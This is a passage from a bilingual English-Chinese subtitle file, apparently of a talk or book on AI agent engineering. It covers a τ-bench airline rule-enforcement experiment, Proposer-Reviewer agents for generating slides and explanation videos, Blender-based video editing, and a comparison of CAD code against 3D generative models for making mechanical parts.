    "en": "Experiment objective: Verify that encoding complex business rules in code significantly improves the accuracy and consistency with which a small model (Qwen3-4B) executes those rules.",
    "zh": "实验目标：验证将复杂的业务规则编码到代码中能显著提高小模型（Qwen3-4B）执行这些规则的准确性和一致性。"
  },
  {
    "id": 536,
    "start": 5017.037,
    "end": 5023.662,
    "en": "Technical approach: Design a controlled experiment based on the τ-bench airline customer service scenario.",
    "zh": "技术方法：基于τ-bench航空客户服务场景设计一个控制实验。"
  },
  {
    "id": 537,
    "start": 5023.662,
    "end": 5029.225,
    "en": "Control group: Pure natural language rules, relying on the model's own reasoning.",
    "zh": "对照组：仅依赖自然语言规则，依靠模型自身的推理。"
  },
  {
    "id": 538,
    "start": 5029.225,
    "end": 5058.387,
    "en": "Experimental group: Three-tier safeguard — system prompt retains natural language rules; tool description lists the complete policy and uses optional expected_ parameters to guide the model to check each condition one by one before calling (checklist); the tool internally performs code-based validation based on simulated database ground truth (all policy facts are obtained from the database, time is taken from the server clock, and the model's self-reported parameters are not trusted).",
    "zh": "实验组：三层保障机制——系统提示保留自然语言规则；工具描述列出完整的政策，并使用可选的expected_参数引导模型逐一检查每个条件后再调用（检查清单）；工具内部基于模拟数据库真值进行代码验证（所有政策事实均来自数据库，时间来自服务器时钟，不信任模型自我报告的参数）。"
  },
  {
    "id": 539,
    "start": 5058.387,
    "end": 5067.562,
    "en": "Evaluation metrics: task success rate, number of policy violations, number of invalid tool calls, user experience.",
    "zh": "评估指标：任务成功率、政策违规次数、无效工具调用次数、用户体验。"
  },
  {
    "id": 540,
    "start": 5067.562,
    "end": 5073.25,
    "en": "Expected results: The experimental group significantly outperforms the control group.",
    "zh": "预期结果：实验组显著优于对照组。"
  },
  {
    "id": 541,
    "start": 5073.25,
    "end": 5084.837,
    "en": "More importantly, the model autonomously identifies policy violations while preparing parameters and offers alternatives without calling the tool, demonstrating the value of parameters as a checklist.",
    "zh": "更重要的是，模型在准备参数时会自主识别策略违规行为，并在不调用工具的情况下提供替代方案，这展示了参数作为检查清单的价值。"
  },
  {
    "id": 542,
    "start": 5084.837,
    "end": 5096.012,
    "en": "Finally, measure the mismatch rate between self-reported expected_ values and database ground truth to show why server-side validation is necessary for catching reasoning errors.",
    "zh": "最后，衡量自我报告的预期值与数据库真实值之间的不匹配率，以说明为什么需要服务器端验证来捕捉推理错误。"
  },
  {
    "id": 543,
    "start": 5096.012,
    "end": 5098.937,
    "en": "Code-Driven Multimedia Generation.",
    "zh": "代码驱动的多媒体生成。"
  },
  {
    "id": 544,
    "start": 5098.937,
    "end": 5105.412,
    "en": "The creation of many complex documents is essentially the organization and presentation of structured data.",
    "zh": "许多复杂文档的创建本质上是结构化数据的组织和展示。"
  },
  {
    "id": 545,
    "start": 5105.412,
    "end": 5119.725,
    "en": "Whether it's a presentation, a technical report, or an interactive application, the underlying structure is defined by code — HTML describes the structure, CSS controls the style, and JavaScript implements interactivity.",
    "zh": "无论是演示文稿、技术报告还是交互式应用，其底层结构都是由代码定义的——HTML描述结构，CSS控制样式，JavaScript实现交互性。"
  },
  {
    "id": 546,
    "start": 5119.725,
    "end": 5130.012,
    "en": "Traditional document creation relies on GUI-based WYSIWYG editors, which are a poor fit for Agents because they require visual interpretation and precise pointer placement.",
    "zh": "传统的文档创建依赖于基于GUI的所见即所得（WYSIWYG）编辑器，这对于智能体来说是不合适的，因为它们需要视觉解释和精确的指针定位。"
  },
  {
    "id": 547,
    "start": 5130.012,
    "end": 5144.262,
    "en": "Through code generation, Agents bypass the challenge of visual positioning and gain precise control over documents — the position, style, and content of each element are clearly defined and can be modified and optimized programmatically.",
    "zh": "通过代码生成，智能体绕过了视觉定位的挑战，并获得了对文档的精确控制——每个元素的位置、样式和内容都明确界定，并且可以以编程方式修改和优化。"
  },
  {
    "id": 548,
    "start": 5144.262,
    "end": 5147.062,
    "en": "PPT Generation Agent.",
    "zh": "PPT生成智能体。"
  },
  {
    "id": 549,
    "start": 5147.062,
    "end": 5150.862,
    "en": "PPT creation is notoriously laborious.",
    "zh": "PPT的创建众所周知地繁琐。"
  },
  {
    "id": 550,
    "start": 5150.862,
    "end": 5159.9,
    "en": "A typical academic presentation runs to dozens of slides, each demanding careful layout, distilled key points, and well-chosen charts.",
    "zh": "一个典型的学术演示文稿可能有几十张幻灯片，每张都需要精心布局、提炼关键点以及选择合适的图表。"
  },
  {
    "id": 551,
    "start": 5159.9,
    "end": 5167.112,
    "en": "Reframe PPT creation as a code generation problem, however, and much of the complexity falls away.",
    "zh": "然而，如果将PPT的创建重新定义为代码生成问题，许多复杂性就会消失。"
  },
  {
    "id": 552,
    "start": 5167.112,
    "end": 5175.6,
    "en": "Modern presentation frameworks such as Slidev embrace an elegant design philosophy: define the content in Markdown and HTML.",
    "zh": "现代演示框架如Slidev采用了一种优雅的设计理念：使用Markdown和HTML定义内容。"
  },
  {
    "id": 553,
    "start": 5175.6,
    "end": 5183.075,
    "en": "Creating a slide takes a few lines of concise markup, and the framework handles rendering, layout, and animation.",
    "zh": "创建一张幻灯片只需几行简洁的标记，而框架会处理渲染、布局和动画。"
  },
  {
    "id": 554,
    "start": 5183.075,
    "end": 5187.987,
    "en": "For an Agent that has mastered code generation, this is ideal terrain.",
    "zh": "对于掌握了代码生成的智能体来说，这正是理想的领域。"
  },
  {
    "id": 555,
    "start": 5187.987,
    "end": 5194.775,
    "en": "As illustrated in Figure 5-5: Proposer-Reviewer mechanism for PPT generation.",
    "zh": "如图5-5所示：PPT生成的提案者-审查者机制。"
  },
  {
    "id": 556,
    "start": 5194.775,
    "end": 5198.025,
    "en": "Generating the code is not enough, though.",
    "zh": "仅仅生成代码是不够的。"
  },
  {
    "id": 557,
    "start": 5198.025,
    "end": 5211.2,
    "en": "Once the Agent has written the code, it has no idea how the result actually renders: content too crowded, text overflowing, images the wrong size — none of this is visible until the slides are actually rendered.",
    "zh": "一旦智能体编写了代码，它并不知道实际结果会如何呈现：内容过于拥挤、文字溢出、图片尺寸错误——这些在幻灯片实际渲染之前都是不可见的。"
  },
  {
    "id": 558,
    "start": 5211.2,
    "end": 5221.45,
    "en": "Therefore, a Proposer-Reviewer mechanism (shown in Figure 5-5) is needed to assign code generation and quality review to two independent Agents:",
    "zh": "因此需要一种提议者-审查者机制（如图5-5所示），将代码生成和质量审查分配给两个独立的智能体："
  },
  {
    "id": 559,
    "start": 5221.45,
    "end": 5231.012,
    "en": "Proposer Agent is responsible for generating Slidev code, understanding the logical structure of the content, and organizing it into well-structured slides.",
    "zh": "提议者智能体负责生成Slidev代码，理解内容的逻辑结构，并将其组织成结构良好的幻灯片。"
  },
  {
    "id": 560,
    "start": 5231.164,
    "end": 5264.839,
    "en": "Reviewer Agent runs the code to render each page as an image, uses a Vision LLM (a multimodal large model that can \"see\" images) to evaluate the rendered slides for content density, readability, layout quality, and visual appeal, and generates structured improvement suggestions — not vague \"doesn't look good,\" but specific, actionable guidance (e.g., \"Page 3: too much content, consider splitting\"; \"Page 7: code block font too small, suggest increasing to 14pt\"), including fields such as page",
    "zh": "审查者智能体运行代码以将每页渲染为图像，使用视觉大模型（一种可以“看到”图像的多模态大模型）评估已渲染幻灯片的内容密度、可读性、布局质量和视觉吸引力，并生成结构化的改进建议——不是模糊的“看起来不好”，而是具体且可操作的指导（例如，“第3页：内容过多，建议拆分”；“第7页：代码块字体太小，建议增加到14磅”），包括页面编号、问题类型和严重程度等字段。"
  },
  {
    "id": 561,
    "start": 5264.839,
    "end": 5268.101,
    "en": "number, issue type, and severity.",
    "zh": "编号、问题类型和严重程度。"
  },
  {
    "id": 562,
    "start": 5268.101,
    "end": 5275.726,
    "en": "The Proposer receives the feedback, interprets it, modifies the code, and resubmits the new version to the Reviewer.",
    "zh": "提议者接收反馈，进行解释，修改代码，并将新版本重新提交给审查者。"
  },
  {
    "id": 563,
    "start": 5275.726,
    "end": 5285.051,
    "en": "This cycle continues until the presentation meets the quality standard or the maximum number of iterations (e.g., five rounds) is reached.",
    "zh": "这个循环会持续进行，直到演示文稿达到质量标准或达到最大迭代次数（例如五轮）。"
  },
  {
    "id": 564,
    "start": 5285.051,
    "end": 5299.939,
    "en": "Quality meets the standard\" and \"maximum rounds\" are exactly the two kinds of explicit stop conditions Loop Engineering calls for: the former lets the reviewer decide the goal has been reached; the latter is a budget cap that keeps the loop from running away.",
    "zh": "“质量符合标准”和“最大轮次”正是Loop Engineering所要求的两种显式停止条件：前者让审查者决定目标已经达成；后者是一个预算上限，防止循环无限制运行。"
  },
  {
    "id": 565,
    "start": 5299.939,
    "end": 5312.501,
    "en": "The iterative loop here and the pre-approval mechanism in Chapter 4 both follow the Proposer-Reviewer pattern introduced in Chapter 1: generation and review are separated, with two models evaluating independently.",
    "zh": "这里的迭代循环和第4章中的预审批机制都遵循第1章中引入的提议者-审查者模式：生成和审查被分开，由两个模型独立评估。"
  },
  {
    "id": 566,
    "start": 5312.501,
    "end": 5318.564,
    "en": "In Loop Engineering terms, these are separate \"maker\" and \"verifier\" sub-agents.",
    "zh": "在Loop Engineering术语中，这些是独立的“制造者”和“验证者”子智能体。"
  },
  {
    "id": 567,
    "start": 5318.564,
    "end": 5322.351,
    "en": "The two applications differ in purpose and workflow.",
    "zh": "这两种应用在目的和工作流程上有所不同。"
  },
  {
    "id": 568,
    "start": 5322.351,
    "end": 5335.264,
    "en": "Chapter 4 uses the pattern to approve or reject a single irreversible operation; here, it drives iterative content improvement over multiple rounds, with the Reviewer seeing rendered output unavailable to the Proposer.",
    "zh": "第4章使用该模式来批准或拒绝一项不可逆的操作；而这里，它通过多轮迭代推动内容改进，审查者可以看到提议者无法看到的渲染输出。"
  },
  {
    "id": 569,
    "start": 5335.264,
    "end": 5347.339,
    "en": "The core design principles are consistent (shared goal constraints, using different model families to reduce the probability of similar errors, feedback as a special event added to the Proposer's trajectory).",
    "zh": "核心设计原则是一致的（共享目标约束，使用不同的模型系列以降低类似错误的概率，反馈作为特殊事件添加到提议者的轨迹中）。"
  },
  {
    "id": 570,
    "start": 5347.339,
    "end": 5366.164,
    "en": "The core advantage of using a dual-agent division of labor rather than a single-agent loop lies in context management: the Reviewer processes only the latest version's rendered images, unaffected by historical versions; the Proposer only accumulates structured text feedback, consuming fewer tokens and making reasoning easier.",
    "zh": "使用双智能体分工而非单智能体循环的核心优势在于上下文管理：审查者仅处理最新版本的渲染图像，不受历史版本的影响；提议者仅积累结构化的文本反馈，消耗更少的标记，使推理更容易。"
  },
  {
    "id": 571,
    "start": 5366.164,
    "end": 5375.601,
    "en": "A single-agent solution would need to accumulate rendered images from multiple rounds for dozens of pages in the same context, quickly exceeding the context limit.",
    "zh": "单智能体解决方案需要在相同上下文中为多页内容累积渲染的图像，很快就会超出上下文限制。"
  },
  {
    "id": 572,
    "start": 5375.601,
    "end": 5387.651,
    "en": "This mechanism will be reused in subsequent experiments on video editing and log visualization; Chapter 10 will further explore other multi-agent collaboration modes beyond the Proposer-Reviewer paradigm.",
    "zh": "此机制将在后续的视频编辑和日志可视化实验中重复使用；第10章将进一步探讨超越提案者-评审者范式的其他多智能体协作模式。"
  },
  {
    "id": 573,
    "start": 5387.812,
    "end": 5395.474,
    "en": "Experiment 5-6 intermediate difficulty, two stars: : Automatic PPT generation from papers",
    "zh": "实验5-6 中等难度，两颗星：从论文自动生成PPT"
  },
  {
    "id": 574,
    "start": 5395.424,
    "end": 5407.249,
    "en": "Experiment objective: Automatically generate high-quality presentations from academic papers, verifying the effectiveness of the Proposer-Reviewer mechanism in content creation quality control.",
    "zh": "实验目标：从学术论文自动生成高质量演示文稿，验证提案者-评审者机制在内容创作质量控制中的有效性。"
  },
  {
    "id": 575,
    "start": 5407.249,
    "end": 5410.912,
    "en": "Technical approach: Use the Slidev framework.",
    "zh": "技术方法：使用Slidev框架。"
  },
  {
    "id": 576,
    "start": 5410.912,
    "end": 5422.649,
    "en": "The Proposer Agent reads the paper PDF, extracts chapter structure, core arguments, and figures, plans the PPT structure, and generates Slidev code page by page.",
    "zh": "提案者智能体读取论文PDF，提取章节结构、核心论点和图表，规划PPT结构，并逐页生成Slidev代码。"
  },
  {
    "id": 577,
    "start": 5422.649,
    "end": 5435.349,
    "en": "Key step: The Reviewer Agent renders each slide and captures a screenshot, then uses a Vision LLM to evaluate the result for text overflow, content crowding, and inappropriate image sizing.",
    "zh": "关键步骤：评审者智能体渲染每张幻灯片并截屏，然后使用视觉大语言模型评估结果，检查文字溢出、内容拥挤和不合适的图像尺寸。"
  },
  {
    "id": 578,
    "start": 5435.349,
    "end": 5440.524,
    "en": "The Proposer and Reviewer iterate until the presentation meets the quality standard.",
    "zh": "提案者与评审者反复迭代，直到演示文稿达到质量标准。"
  },
  {
    "id": 579,
    "start": 5440.524,
    "end": 5446.912,
    "en": "Acceptance criteria: Generate 10-20 slides covering the paper's main contributions.",
    "zh": "接受标准：生成10-20张幻灯片，涵盖论文的主要贡献。"
  },
  {
    "id": 580,
    "start": 5446.912,
    "end": 5451.724,
    "en": "Include at least three figures from the paper that match the accompanying text.",
    "zh": "至少包含三张与配套文本匹配的论文图表。"
  },
  {
    "id": 581,
    "start": 5451.724,
    "end": 5455.724,
    "en": "No text overflow in rendering, reasonable layout.",
    "zh": "渲染中无文字溢出，布局合理。"
  },
  {
    "id": 582,
    "start": 5455.724,
    "end": 5463.437,
    "en": "Compare context consumption and generation quality between single-agent self-review and a Proposer-Reviewer division of labor.",
    "zh": "比较单智能体自检与提案者-评审者分工在上下文消耗和生成质量方面的差异。"
  },
  {
    "id": 583,
    "start": 5463.437,
    "end": 5471.387,
    "en": "Experiment 5-7 intermediate difficulty, two stars: : Automatic generation of paper explanation videos",
    "zh": "实验5-7 中等难度，两颗星：自动生成论文解释视频"
  },
  {
    "id": 584,
    "start": 5471.387,
    "end": 5482.049,
    "en": "Experiment objective: Extend PPT generation capabilities, combining visual and auditory channels to achieve automatic generation of explanation videos.",
    "zh": "实验目标：扩展PPT生成能力，结合视觉和听觉通道，实现解释视频的自动生成。"
  },
  {
    "id": 585,
    "start": 5482.049,
    "end": 5503.574,
    "en": "Technical approach: Building on the presentation workflow from Experiment 5-6, the Agent also generates conversational narration for each slide—guiding the viewer rather than repeating the slide text—uses TTS (text-to-speech) to synthesize the audio, and combines the slide images and audio with FFmpeg to produce the final video.",
    "zh": "技术方法：基于实验5-6的演示文稿工作流程，智能体还为每张幻灯片生成对话式讲解——引导观众而非重复幻灯片文本——使用TTS（文本转语音）合成音频，并将幻灯片图像和音频通过FFmpeg合并生成最终视频。"
  },
  {
    "id": 586,
    "start": 5503.574,
    "end": 5514.912,
    "en": "Acceptance criteria: Produce a video lasting 5 to 15 minutes in which each slide's display time precisely matches its narration and the narration corresponds to the visual elements.",
    "zh": "验收标准：制作一个时长为5到15分钟的视频，其中每张幻灯片的显示时间必须精确匹配其旁白，并且旁白要与视觉元素相对应。"
  },
  {
    "id": 587,
    "start": 5514.912,
    "end": 5521.462,
    "en": "As illustrated in Figure 5-6: End-to-end pipeline from paper to explanation video.",
    "zh": "如图5-6所示：从论文到解释视频的端到端流程。"
  },
  {
    "id": 588,
    "start": 5521.462,
    "end": 5523.774,
    "en": "Video Editing Agent.",
    "zh": "视频编辑智能体。"
  },
  {
    "id": 589,
    "start": 5523.774,
    "end": 5536.237,
    "en": "Editing video through a general-purpose Computer Use interface presents a fundamental obstacle: video-editing GUIs are extraordinarily complex — dense with timelines, layers, and effects panels.",
    "zh": "通过通用计算机使用界面进行视频编辑会遇到一个根本性障碍：视频编辑的GUI界面极其复杂——包含大量的时间轴、图层和效果面板。"
  },
  {
    "id": 590,
    "start": 5536.237,
    "end": 5544.662,
    "en": "An Agent must locate and manipulate these elements with a mouse and keyboard, which requires exact coordinates that models struggle to produce.",
    "zh": "智能体必须通过鼠标和键盘定位并操作这些元素，这需要精确的坐标，而模型难以生成。"
  },
  {
    "id": 591,
    "start": 5544.662,
    "end": 5551.049,
    "en": "Reframing video editing as API calls and code generation cuts the complexity dramatically.",
    "zh": "将视频编辑重新定义为API调用和代码生成可以大幅降低复杂度。"
  },
  {
    "id": 592,
    "start": 5551.049,
    "end": 5571.512,
    "en": "Many professional software tools (such as Blender — an open-source 3D creation and video compositing tool that supports Python scripting; FFmpeg — the command-line Swiss Army knife for audio/video processing) provide programmatic API interfaces that expose core functionality in a structured, composable manner.",
    "zh": "许多专业软件工具（如Blender——一款支持Python脚本的开源3D创作和视频合成工具；FFmpeg——用于音视频处理的命令行瑞士军刀）提供了程序化的API接口，以结构化和可组合的方式暴露核心功能。"
  },
  {
    "id": 593,
    "start": 5571.512,
    "end": 5586.812,
    "en": "For example, the Blender Python API allows precise control over operations such as importing, trimming, arranging, adding transition effects, and mixing audio for video clips, with each operation corresponding to a clear function call.",
    "zh": "例如，Blender的Python API可以对视频剪辑的导入、裁剪、排列、添加过渡效果和音频混合等操作进行精确控制，每个操作都对应一个明确的函数调用。"
  },
  {
    "id": 594,
    "start": 5586.812,
    "end": 5596.424,
    "en": "For an Agent, converting natural language requirements into API calls is far easier than understanding a GUI interface and simulating mouse clicks.",
    "zh": "对于智能体而言，将自然语言需求转换为API调用比理解GUI界面并模拟鼠标点击要容易得多。"
  },
  {
    "id": 595,
    "start": 5596.424,
    "end": 5612.274,
    "en": "Similar to PPT generation, video editing also adopts the Proposer-Reviewer mechanism — the Proposer Agent generates Blender scripts, the Reviewer Agent renders keyframes and uses a Vision LLM to check the effect, providing feedback for modification.",
    "zh": "与PPT生成类似，视频编辑也采用提议者-审查者机制——提议者智能体生成Blender脚本，审查者智能体渲染关键帧并使用视觉大语言模型检查效果，提供修改反馈。"
  },
  {
    "id": 596,
    "start": 5612.274,
    "end": 5619.374,
    "en": "Experiment 5-8 intermediate difficulty, two stars: : API-based intelligent video editing",
    "zh": "实验5-8 中等难度，两颗星：基于API的智能视频编辑"
  },
  {
    "id": 597,
    "start": 5619.374,
    "end": 5633.449,
    "en": "Experiment objective: Verify the Agent's ability to perform video editing by generating Blender Python API code, and evaluate the role of the vision-feedback-based Proposer-Reviewer mechanism in multimedia content processing.",
    "zh": "实验目标：验证智能体通过生成Blender Python API代码执行视频编辑的能力，并评估基于视觉反馈的提议者-审查者机制在多媒体内容处理中的作用。"
  },
  {
    "id": 598,
    "start": 5633.62,
    "end": 5652.582,
    "en": "Core challenge: Understanding the user's natural language editing requirements and converting them into precise sequences of API calls, handling various editing operations (trimming, merging, subtitles, audio track mixing, visual effects), and ensuring the generated Python script executes correctly.",
    "zh": "核心挑战：理解用户的自然语言编辑需求并将其转化为精确的API调用序列，处理各种编辑操作（裁剪、合并、字幕、音频轨道混音、视觉特效），并确保生成的Python脚本能够正确执行。"
  },
  {
    "id": 599,
    "start": 5652.532,
    "end": 5663.27,
    "en": "After the Proposer Agent writes the code, it cannot directly assess the resulting video; it must rely on the Reviewer Agent to render and use a Vision LLM to check keyframes.",
    "zh": "提议者智能体编写代码后无法直接评估结果视频；它必须依赖审查者智能体进行渲染，并使用视觉大语言模型检查关键帧。"
  },
  {
    "id": 600,
    "start": 5663.27,
    "end": 5676.845,
    "en": "Technical approach: The user provides video material (e.g., raw footage containing scenes like surfing, hiking, skiing) and describes requirements in natural language (e.g., \"Extract the surfing segment\").",
    "zh": "技术方法：用户提供的视频素材（例如包含冲浪、徒步、滑雪场景的原始画面）并以自然语言描述需求（例如“提取冲浪片段”）。"
  },
  {
    "id": 601,
    "start": 5676.845,
    "end": 5682.982,
    "en": "The Proposer Agent uses a video analysis sub-agent with a two-step localization strategy:",
    "zh": "提议者智能体使用一个视频分析子智能体，采用两步定位策略："
  },
  {
    "id": 602,
    "start": 5682.982,
    "end": 5691.782,
    "en": "Step 1, coarse localization: Call the sub-agent with the video path, a 10-second frame-sampling interval, and the target question.",
    "zh": "第一步，粗略定位：通过视频路径、10秒的帧采样间隔和目标问题调用子智能体。"
  },
  {
    "id": 603,
    "start": 5691.782,
    "end": 5704.645,
    "en": "The sub-agent uses ffmpeg to capture frames at that interval, sends the screenshots and question to a Vision LLM, and returns the scene interval (e.g., \"Surfing is between 40-110 seconds\").",
    "zh": "子智能体使用ffmpeg在该间隔内捕获帧，将截图和问题发送给视觉大语言模型，并返回场景区间（例如，“冲浪出现在40-110秒之间”）。"
  },
  {
    "id": 604,
    "start": 5704.645,
    "end": 5714.307,
    "en": "Step 2, fine-grained localization: Call the sub-agent again over a narrower range and sample one frame per second to locate the boundaries precisely.",
    "zh": "第二步，细粒度定位：在更窄的范围内再次调用子智能体，每秒采样一帧以精确确定边界。"
  },
  {
    "id": 605,
    "start": 5714.307,
    "end": 5722.22,
    "en": "Encapsulating video analysis as a sub-agent prevents a large number of screenshots from occupying the main Agent's context.",
    "zh": "将视频分析封装为子智能体可防止大量截图占用主智能体的上下文。"
  },
  {
    "id": 606,
    "start": 5722.22,
    "end": 5727.332,
    "en": "After localization, the Proposer generates the Blender API script.",
    "zh": "定位完成后，提议者生成Blender API脚本。"
  },
  {
    "id": 607,
    "start": 5727.332,
    "end": 5737.195,
    "en": "The Reviewer Agent performs a quick preview, checks keyframes, and provides feedback for modification, iterating until the standard is met before full rendering.",
    "zh": "评审者智能体进行快速预览，检查关键帧并提供修改反馈，迭代直至符合标准后再进行完整渲染。"
  },
  {
    "id": 608,
    "start": 5737.195,
    "end": 5746.77,
    "en": "Acceptance criteria: The Agent can accurately identify different scenes in the video and correctly generate editing scripts based on natural language instructions.",
    "zh": "验收标准：智能体能够准确识别视频中的不同场景，并根据自然语言指令正确生成编辑脚本。"
  },
  {
    "id": 609,
    "start": 5746.77,
    "end": 5751.357,
    "en": "The start and end points are accurate (error within 3 seconds).",
    "zh": "起止点准确（误差在3秒以内）。"
  },
  {
    "id": 610,
    "start": 5751.357,
    "end": 5761.195,
    "en": "If the instructions include special effects requirements (slow motion, transitions, subtitles), the generated video correctly applies the effects.",
    "zh": "如果指令包含特效要求（慢动作、转场、字幕），生成的视频能正确应用这些特效。"
  },
  {
    "id": 611,
    "start": 5761.195,
    "end": 5769.345,
    "en": "The Reviewer Agent can detect obvious errors (missing key content, including irrelevant segments) and trigger corrections.",
    "zh": "评审者智能体可以检测明显错误（缺少关键内容，包含无关片段）并触发修正。"
  },
  {
    "id": 612,
    "start": 5769.345,
    "end": 5774.607,
    "en": "The final output video file has the correct format and meets expected quality.",
    "zh": "最终输出的视频文件格式正确且符合预期质量。"
  },
  {
    "id": 613,
    "start": 5774.607,
    "end": 5780.757,
    "en": "3D and Industrial Parts: The Boundary Between Code Generation and Generative Models.",
    "zh": "3D与工业零件：代码生成与生成模型之间的界限。"
  },
  {
    "id": 614,
    "start": 5780.757,
    "end": 5802.232,
    "en": "When it comes to \"generating a thing,\" the Agent faces two routes: one is writing code to construct it precisely (CadQuery, OpenSCAD, Blender API); the other is calling a 3D generative model directly (text/image-to-3D models like Hunyuan 3D, which belong to the same diffusion family as text-to-image models).",
    "zh": "当涉及到“生成一个物体”时，智能体面临两种路径：一种是编写代码精确构建它（如CadQuery、OpenSCAD、Blender API）；另一种是直接调用3D生成模型（如文本/图像到3D模型，如 Hunyuan 3D，这属于与文本到图像模型相同的扩散家族）"
  },
  {
    "id": 615,
    "start": 5802.232,
    "end": 5810.22,
    "en": "Many people wrestle with the question: when should you use code generation, and when should you use an image/3D generative model?",
    "zh": "许多人纠结于这样的问题：何时应使用代码生成，何时应使用图像/3D生成模型？"
  },
  {
    "id": 616,
    "start": 5810.22,
    "end": 5815.257,
    "en": "First, check whether the artifact has a compact, precise description.",
    "zh": "首先，检查该工件是否有简洁且精确的描述。"
  },
  {
    "id": 617,
    "start": 5815.257,
    "end": 5818.207,
    "en": "Industrial parts naturally have one.",
    "zh": "工业零件自然具备这一点。"
  },
  {
    "id": 618,
    "start": 5818.207,
    "end": 5829.995,
    "en": "A flange is fully defined by five or six parameters—outer diameter, thickness, bolt-circle diameter, hole diameter, hole count—and code is a lossless expression of it.",
    "zh": "法兰由五个或六个参数完全定义——外径、厚度、螺栓圆直径、孔径、孔数，而代码是对它的无损表达。"
  },
  {
    "id": 619,
    "start": 5829.995,
    "end": 5839.382,
    "en": "A potted plant, a Taihu rock, or a human face is different—they have countless details, and their intrinsic complexity is nearly unbounded.",
    "zh": "而一盆植物、太湖石或人脸则不同——它们有无数细节，其内在复杂性几乎无限。"
  },
  {
    "id": 620,
    "start": 5839.382,
    "end": 5843.832,
    "en": "Second, check the precision requirements and verifiability.",
    "zh": "其次，检查精度要求和可验证性。"
  },
  {
    "id": 621,
    "start": 5843.832,
    "end": 5854.857,
    "en": "Every dimension of a part is a hard constraint—hole diameter 5mm, tolerance ±0.05mm; off by a hair and it is scrap.",
    "zh": "零件的每个尺寸都是硬性约束——孔径5毫米，公差±0.05毫米；稍有偏差就成为废品。"
  },
  {
    "id": 622,
    "start": 5854.857,
    "end": 5865.395,
    "en": "A code-generated part can be verified programmatically: load the mesh, measure the outer diameter and hole positions, and check them item by item against the specification.",
    "zh": "通过代码生成的零件可以进行程序化验证：加载网格，测量外径和孔的位置，并逐项与规格进行比对。"
  },
  {
    "id": 623,
    "start": 5865.395,
    "end": 5871.532,
    "en": "A part produced by a 3D generative model cannot be checked against the specification directly.",
    "zh": "而通过3D生成模型生产的零件无法直接与规格进行比对。"
  },
  {
    "id": 624,
    "start": 5871.7,
    "end": 5877.2,
    "en": "The two routes differ in one more practical way: representation and editability.",
    "zh": "这两条路径在另一个更实际的方面有所不同：表示方式和可编辑性。"
  },
  {
    "id": 625,
    "start": 5877.15,
    "end": 5889.375,
    "en": "Manufacturing workflows demand B-rep (boundary representation) parametric solids—the STEP file stores the feature tree and dimensional parameters and can drive CNC machining directly.",
    "zh": "制造工作流需要B-Rep（边界表示）参数化实体——STEP文件存储特征树和尺寸参数，并可直接驱动CNC加工。"
  },
  {
    "id": 626,
    "start": 5889.375,
    "end": 5899.35,
    "en": "What a 3D generative model spits out is a triangle mesh: curved surfaces are approximated by countless tiny facets and look pitted under magnification.",
    "zh": "3D生成模型输出的是三角形网格：曲面由无数微小的面片近似，放大后看起来会显得凹凸不平。"
  },
  {
    "id": 627,
    "start": 5899.35,
    "end": 5918.45,
    "en": "The difference becomes clear when the client says \"change the mounting holes from M5 to M6\": on the code route, you change one number and rerun, and every other dimension stays exactly the same; on the generative-model route, the only option is to regenerate the whole thing—whether the other dimensions drift is a matter of luck.",
    "zh": "当客户说“将安装孔从M5改为M6”时，差异变得清晰：在代码路径中，只需更改一个数字并重新运行，其他所有尺寸都会保持完全不变；而在生成模型路径中，唯一的选择是重新生成整个模型——其他尺寸是否偏移则取决于运气。"
  },
  {
    "id": 628,
    "start": 5918.45,
    "end": 5930.437,
    "en": "So choosing a route is itself a decision the Agent must make: weigh the artifact's intrinsic complexity and precision requirements, and assign the task to code generation or to a 3D generative model.",
    "zh": "因此，选择路径本身是智能体必须做出的决策：权衡工件的内在复杂性和精度要求，并将任务分配给代码生成或3D生成模型。"
  },
  {
    "id": 629,
    "start": 5930.437,
    "end": 5940.7,
    "en": "In real systems the two routes can also be mixed—generate the geometry parametrically with code and hand the surface texture to a generative model, taking the best of each.",
    "zh": "在实际系统中，这两种路径也可以结合使用——用代码参数化生成几何结构，将表面纹理交给生成模型，各取所长。"
  },
  {
    "id": 630,
    "start": 5940.7,
    "end": 5949.675,
    "en": "Experiment 5-9 intermediate difficulty, two stars: : Two Generation Routes for the Same Part—Code vs. Generative Model",
    "zh": "实验5-9 中等难度，两颗星：同一零件的两种生成路径——代码 vs 生成模型"
  },
  {
    "id": 631,
    "start": 5949.675,
    "end": 5968.45,
    "en": "Experiment objective: Take the same mechanical part with dimensional specifications and compare the code-generation and 3D-generative-model routes on dimensional accuracy, editability, and manufacturability, verifying the \"choose the route by intrinsic complexity and precision requirements\" decision framework.",
    "zh": "实验目标：对具有尺寸规格的相同机械部件，比较代码生成和3D生成模型在尺寸精度、可编辑性和可制造性方面的表现，验证\"根据内在复杂性和精度要求选择路径\"的决策框架。"
  },
  {
    "id": 632,
    "start": 5968.45,
    "end": 5983.087,
    "en": "Technical approach: A natural-language requirement with an explicit specification (e.g., \"a flange, outer diameter 80mm, thickness 10mm, 4 evenly spaced M5 mounting holes on a 60mm bolt circle\").",
    "zh": "技术方法：一个带有明确规格的自然语言需求（例如，\"法兰，外径80mm，厚度10mm，在60mm螺栓圆上均匀分布的4个M5安装孔\"）"
  },
  {
    "id": 633,
    "start": 5983.087,
    "end": 5991.025,
    "en": "Route A: the Agent writes CadQuery (or OpenSCAD) code to construct the part and exports STEP and STL.",
    "zh": "路径A：智能体编写CadQuery（或OpenSCAD）代码来构建部件，并导出STEP和STL格式。"
  },
  {
    "id": 634,
    "start": 5991.025,
    "end": 5999.587,
    "en": "Route B: hand the same specification to a 3D generative model (such as Hunyuan 3D) to obtain a triangle mesh.",
    "zh": "路径B：将相同的规格交给一个3D生成模型（如 Hunyuan 3D），以获得三角形网格。"
  },
  {
    "id": 635,
    "start": 5999.587,
    "end": 6012.812,
    "en": "Programmatic verification: measure the key dimensions of both routes' outputs (outer diameter, thickness, hole positions, hole diameters) against the specification, and check the flatness of the mounting face.",
    "zh": "程序化验证：测量两种路径输出的关键尺寸（外径、厚度、孔位、孔径）与规格对比，并检查安装面的平整度。"
  },
  {
    "id": 636,
    "start": 6012.812,
    "end": 6031.612,
    "en": "Then issue the change request \"change the mounting holes from M5 to M6\" and record the modification cost of each route—on the code route, change one parameter and rerun; on the generative-model route, the only option is to regenerate the whole thing, with no guarantee that the other dimensions stay unchanged.",
    "zh": "然后发出修改请求“将安装孔从M5改为M6”，并记录每种路径的修改成本——在代码路径中，只需更改一个参数并重新运行；而在生成模型路径中，唯一的选择是重新生成整个模型，且无法保证其他尺寸保持不变。"
  },
  {
    "id": 637,
    "start": 6031.612,
    "end": 6045.862,
